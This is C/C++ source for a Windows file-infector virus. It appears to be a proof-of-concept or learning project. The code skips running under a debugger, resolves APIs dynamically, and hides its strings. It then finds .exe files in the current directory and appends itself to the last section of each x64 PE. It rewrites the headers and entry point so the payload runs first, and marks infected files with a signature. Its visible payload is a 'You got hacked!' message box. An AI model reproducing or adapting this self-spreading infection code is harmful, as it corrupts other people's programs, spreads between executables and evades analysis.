#include "payload.h"
#include <Windows.h>
#include "injected.h"
#include "libproc.hpp"
#include "utils.h"

EXTERN_C_START
extern CONST BYTE __payload_start;
extern CONST VOID payload();
extern CONST LONGLONG delta_start;
extern CONST DWORD code_size;
#ifndef SKIP_SIGN
extern CONST DWORD signature;
#endif  // SKIP_SIGN
EXTERN_C_END

INJECTED_CODE VOID inj_code_c() {
#ifndef NO_ANTIDBG
    if (being_debugged()) {
        // __debugbreak();
        // __fastfail(FAST_FAIL_FATAL_APP_EXIT);
        // ((PVOID(*)())NULL)();

        // If we're being debugged, do not run the payload, just run the program normally
        return;
    }
#endif  // NO_ANTIDBG

    // Declare obfuscated strings for the rest of the function
    DECLARE_OBFUSCATED(user32, "USER32.DLL");       // DLL to load for MessageBoxA
    DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");       // MessageBoxA title
    DECLARE_OBFUSCATED(mbText, "You got hacked!");  // MessageBoxA text
    DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
#ifdef PL_DEBUG
    // Declarations for debug strings
    CONST CHAR sNewline[1] = {'\n'};

    INJECTED_VAR static CONST CHAR mbDbgTitle[] = "Debug";
    INJECTED_VAR static CONST CHAR msgSeparator[] = "====================";
    INJECTED_VAR static CONST CHAR msgModuleName[] = "Current module name: ";
    INJECTED_VAR static CONST CHAR msgInjecting[] = "Injecting: ";
    INJECTED_VAR static CONST CHAR msgSkipping[] = "Skipping file: ";
    INJECTED_VAR static CONST CHAR errGetModName[] = "Error getting module name";
    INJECTED_VAR static CONST CHAR errGetDir[] = "Error getting current directory";
    INJECTED_VAR static CONST CHAR errFindFile[] = "No .exe files";
    INJECTED_VAR static CONST CHAR errOpenFile[] = "Error opening file";
    INJECTED_VAR static CONST CHAR errMapFile[] = "Error mapping file";
    INJECTED_VAR static CONST CHAR errNotPE[] = "Not a PE x64 file";
    INJECTED_VAR static CONST CHAR errAlreadyInjected[] = "Payload already injected";
#endif  // PL_DEBUG

    // Get module handles and function pointers
    /* */
    CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
    CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
    CONST auto pGetModuleFileNameA = GET_FUNC(pKernel32Dll, GetModuleFileNameA);
    CONST auto pCreateFileA = GET_FUNC(pKernel32Dll, CreateFileA);
    CONST auto pGetFileSize = GET_FUNC(pKernel32Dll, GetFileSize);
    CONST auto pCreateFileMappingA = GET_FUNC(pKernel32Dll, CreateFileMappingA);
    CONST auto pMapViewOfFile = GET_FUNC(pKernel32Dll, MapViewOfFile);
    CONST auto pFlushViewOfFile = GET_FUNC(pKernel32Dll, FlushViewOfFile);
    CONST auto pUnmapViewOfFile = GET_FUNC(pKernel32Dll, UnmapViewOfFile);
    CONST auto pCloseHandle = GET_FUNC(pKernel32Dll, CloseHandle);
    CONST auto pGetCurrentDirectoryA = GET_FUNC(pKernel32Dll, GetCurrentDirectoryA);
    CONST auto pFindFirstFileA = GET_FUNC(pKernel32Dll, FindFirstFileA);
    CONST auto pFindNextFileA = GET_FUNC(pKernel32Dll, FindNextFileA);
    CONST auto pFindClose = GET_FUNC(pKernel32Dll, FindClose);

    CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
    CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);

#ifdef PL_DEBUG
    BOOL bUseMsgbox = FALSE;  // Whether to use MessageBoxA for debug, if no console is available
    CONST auto pGetStdHandle = GET_FUNC(pKernel32Dll, GetStdHandle);
    CONST auto pWriteConsoleA = GET_FUNC(pKernel32Dll, WriteConsoleA);
    HANDLE hStderr = pGetStdHandle(STD_ERROR_HANDLE);
    if (!hStderr || hStderr == INVALID_HANDLE_VALUE) {
        bUseMsgbox = TRUE;
    }

#define PRINT_DBG_OR_MB(text, allowMb)                                         \
    do {                                                                       \
        if (allowMb && bUseMsgbox) {                                           \
            pMessageBoxA(NULL, text, mbDbgTitle, MB_OK | MB_ICONINFORMATION);  \
        } else {                                                               \
            pWriteConsoleA(hStderr, text, (DWORD)my_strlen(text), NULL, NULL); \
        }                                                                      \
    } while (0)

#define PRINT_DBG(text)       PRINT_DBG_OR_MB(text, TRUE)
#define PRINT_DBG_NO_MB(text) PRINT_DBG_OR_MB(text, FALSE)

#define PRINT_DBG_NL()                                        \
    do {                                                      \
        if (!bUseMsgbox) {                                    \
            pWriteConsoleA(hStderr, sNewline, 1, NULL, NULL); \
        }                                                     \
    } while (0)
#else                   // PL_DEBUG
#define PRINT_DBG(text) /* [Debug disabled] */
#define PRINT_DBG_NL()  /* [Debug disabled] */
#endif                  // PL_DEBUG
    /* */

    LPSTR sDirEnd;  // Pointer to the end of the directory path in `sFilePath`, after the final '\\'
    HANDLE hFind;   // Handle for the file search

    CHAR sModuleName[MAX_PATH];  // Buffer for the module name
    DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
    if (res == 0 || res >= sizeof(sModuleName)) {
        PRINT_DBG(errGetModName);
        goto end;
    }
    PRINT_DBG(msgModuleName);
    PRINT_DBG(sModuleName);
    PRINT_DBG_NL();

    CHAR sDirName[MAX_PATH];   // Buffer for the directory name
    CHAR sFindPath[MAX_PATH];  // Buffer for the search path
    res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
    if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
        PRINT_DBG(errGetDir);
        goto end;
    }
    // Append a backslash to the current directory name
    my_strappend(sDirName, '\\');
    // Set the search path to "$PWD\*.exe"
    my_strcpy(sFindPath, sDirName);
    my_strcat(sFindPath, DEOBF(exeExt));

    CHAR sFilePath[MAX_PATH];  // Buffer for the full file path
    sDirEnd = my_strcpy(sFilePath, sDirName) - 1;

    WIN32_FIND_DATAA findData;  // Structure to hold file search results
    hFind = pFindFirstFileA(sFindPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        PRINT_DBG(errFindFile);
        goto end;
    }

    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwFileAlignment, dwNewFileSize, dwSizeAligned;
#ifndef SKIP_SIGN
    DWORD dwSignature;
#endif  // SKIP_SIGN
    PCIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS64 pNtHeader;
    PIMAGE_SECTION_HEADER pSection, pLastSection;
    DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwLastSectionEnd, dwOrigEntryPoint;
    WORD wNbSectionsMin1;  // Number of sections minus 1 (for array indexing)
    PBYTE pPayloadData;

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip directories
            continue;
        }

        // Construct the full file path by appending the file name to the directory path
        my_strcpy(sDirEnd, findData.cFileName);
        if (!my_stricmp(sFilePath, sModuleName)  // Skip the current module
#ifdef NEED_BANG
            || sDirEnd[0] != '!'  // Skip file names not starting with '!' if `NEED_BANG` is defined
#endif                            // NEED_BANG
        ) {
            PRINT_DBG(msgSkipping);
            PRINT_DBG(sFilePath);
            PRINT_DBG_NL();
            continue;
        }
        PRINT_DBG(msgInjecting);
        PRINT_DBG(sFilePath);
        PRINT_DBG_NL();

        hFile = pCreateFileA(sFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            PRINT_DBG(errOpenFile);
            PRINT_DBG_NL();
            continue;
        }

        dwFileSize = pGetFileSize(hFile, NULL);

        // First, map the file in read-only mode to check if it's a valid PE file, and get some
        // information about it (eg. alignment, to remap it in read-write mode later on)

        hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, dwFileSize, NULL);
        if (hMapFile == NULL) {
            PRINT_DBG(errMapFile);
            PRINT_DBG_NL();
            goto close_file;
        }

        pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
        if (pMapAddress == NULL) {
            PRINT_DBG(errMapFile);
            PRINT_DBG_NL();
            goto close_map;
        }

        pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            goto invalid_pe;
        }

        pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
            pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            goto invalid_pe;
        }

        dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
        wNbSectionsMin1 = pNtHeader->FileHeader.NumberOfSections - 1;
        pSection = IMAGE_FIRST_SECTION(pNtHeader);
        pLastSection = &pSection[wNbSectionsMin1];
        dwLastSectionPtr = pLastSection->PointerToRawData;
        dwLastSectionSize = pLastSection->SizeOfRawData;
        dwLastSectionRva = pLastSection->VirtualAddress;
        dwLastSectionEnd = dwLastSectionRva + dwLastSectionSize;
        dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;

#ifndef SKIP_SIGN
        // Check if the payload is already injected by looking for the signature
        // right before the entry point, if it's inside the last section
        if (dwOrigEntryPoint >= dwLastSectionRva && dwOrigEntryPoint < dwLastSectionEnd) {
            dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
                                     (dwOrigEntryPoint - dwLastSectionRva) -
                                     ((PCBYTE)&payload - (PCBYTE)&signature));
            if (dwSignature == signature) {
                PRINT_DBG(errAlreadyInjected);
                PRINT_DBG_NL();
                goto unmap;
            }
        }
#endif  // SKIP_SIGN

        // All checks passed, the file seems to be a valid PE x64 executable
        // Let's inject the payload into the last section

        // Unmap the file to remap it in read-write mode
        pUnmapViewOfFile(pMapAddress);
        pCloseHandle(hMapFile);

        // Section raw data must be aligned to FileAlignment
        // Since the original section is assumed to be aligned, we just need to align the payload
        dwSizeAligned = ALIGN(code_size, dwFileAlignment);
        // Make sure the final file size is aligned
        dwNewFileSize = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);

        // Remap the file in read-write mode to inject the payload and update the headers
        hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
        if (hMapFile == NULL) {
            PRINT_DBG(errMapFile);
            PRINT_DBG_NL();
            goto close_file;
        }

        pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
        if (pMapAddress == NULL) {
            PRINT_DBG(errMapFile);
            PRINT_DBG_NL();
            goto close_map;
        }

        pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            goto invalid_pe;
        }

        pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
            pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            goto invalid_pe;
        }

        pSection = IMAGE_FIRST_SECTION(pNtHeader);
        pLastSection = &pSection[wNbSectionsMin1];
        pPayloadData = (PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize;

        pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
        pLastSection->SizeOfRawData += dwSizeAligned;
        // If the last section is already code, only add the new payload size to SizeOfCode
        // Otherwise, add the whole section size since we're going to mark it as code anyway
        pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                    ? dwSizeAligned
                                                    : pLastSection->SizeOfRawData;
        // SizeOfImage must be aligned to SectionAlignment
        pNtHeader->OptionalHeader.SizeOfImage =
            ALIGN(dwLastSectionRva + pLastSection->Misc.VirtualSize,
                  pNtHeader->OptionalHeader.SectionAlignment);
        // Make the last section executable, and mark it as code and not discardable
        pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
        pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
        pNtHeader->OptionalHeader.AddressOfEntryPoint =
            dwLastSectionEnd + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);

        // Inject the payload and update the entry point delta
        my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
            (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;

        pFlushViewOfFile(pMapAddress, 0);
        goto unmap;

    invalid_pe:
        PRINT_DBG(errNotPE);
        PRINT_DBG_NL();
    unmap:
        pUnmapViewOfFile(pMapAddress);
    close_map:
        pCloseHandle(hMapFile);
    close_file:
        pCloseHandle(hFile);
    } while (pFindNextFileA(hFind, &findData));

    pFindClose(hFind);

end:
    PRINT_DBG_NL();
    PRINT_DBG_NO_MB(msgSeparator);
    PRINT_DBG_NL();

    // Actual malicious payload: display a message box
    pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle),
                 MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
}
